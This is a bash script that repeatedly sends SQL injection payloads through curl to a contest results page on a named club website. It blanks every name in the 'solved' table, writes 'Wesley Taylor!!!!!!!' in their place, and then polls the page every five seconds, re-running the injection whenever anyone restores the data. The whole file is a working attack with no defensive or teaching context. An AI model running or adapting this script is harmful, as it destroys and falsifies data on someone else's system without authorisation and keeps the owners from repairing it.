#!/bin/bash

curl -s --data "num_results=0; UPDATE solved SET name='' WHERE 1;" http://cs-club.ca/contest/results.php > /dev/null
curl -s --data "num_results=0; UPDATE solved SET name='Wesley Taylor!!!!!!!' WHERE 1 LIMIT 1;" http://cs-club.ca/contest/results.php  > /dev/null
NOT_CHANGED=$(curl -s --data "num_results=10" http://cs-club.ca/contest/results.php);

while true; do
    NEW=$(curl -s --data "num_results=10" http://cs-club.ca/contest/results.php);
    if [ "$NEW" != "$NOT_CHANGED" ];
    then
        echo "$(date) - Changed.";
        curl -s --data "num_results=10; UPDATE solved SET name='' WHERE 1;" http://cs-club.ca/contest/results.php;
        curl -s --data "num_results=0; UPDATE solved SET name='Wesley Taylor!!!!!!!' WHERE 1; SLEEP(10);" http://cs-club.ca/contest/results.php > /dev/null
    else
        echo "$(date) - Not Changed."
    fi
    sleep 5s;
done
